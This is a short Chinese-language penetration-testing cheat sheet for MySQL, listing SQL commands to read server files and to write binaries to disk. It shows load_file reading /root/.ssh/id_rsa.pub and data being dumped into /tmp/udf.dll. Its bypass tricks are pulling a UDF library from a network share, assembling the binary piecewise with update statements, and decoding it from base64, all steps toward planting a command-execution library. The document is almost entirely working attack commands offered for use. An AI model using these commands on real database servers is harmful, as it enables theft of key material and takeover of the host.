## 1. 渗透



### 1.2. 读文件

```mysql
# 创建临时表
create temporary table text(test text);

# 极小文件
select hex(load_file('/root/.ssh/id_rsa.pub'));

# 大文件
insert into text(test) values (load_file('/root/.ssh/id_rsa.pub'));

# 超大文件
# 需要开启 secure_file_priv
# 存在编码问题
load data infile 'E:\\a.jar' into table text FIELDS TERMINATED BY 'a1b2c3d4;a1b2c3d4;' lines terminated by '\0' (@test) set test=hex(@test);

# mysqldump -uroot -h127.0.0.1 -P3306 -p text > text
```



### 1.3. 写文件

```mysql
# 需要开启 secure_file_priv
select 0x30 into dumpfile '/tmp/udf.dll';
```

关于绕过可以用：

1. load_file函数支持网络路径。`load_file('\\\\192.168.0.19\\network\\lib_mysqludf_sys_64.dll') `

2. 将二进制拆分，用update写入表中。

   ```mysql
   create table temp(data longblob);
   insert into temp(data) values 0x30;
   update temp set data = concat(data ,0x31);
   select data from temp into dumpfile '/tmp/udf.dll';
   ```

3. 利用base64。

   ```mysql
   select from_base64("MQo=") into dumpfile '/tmp/udf.dll';
   ```


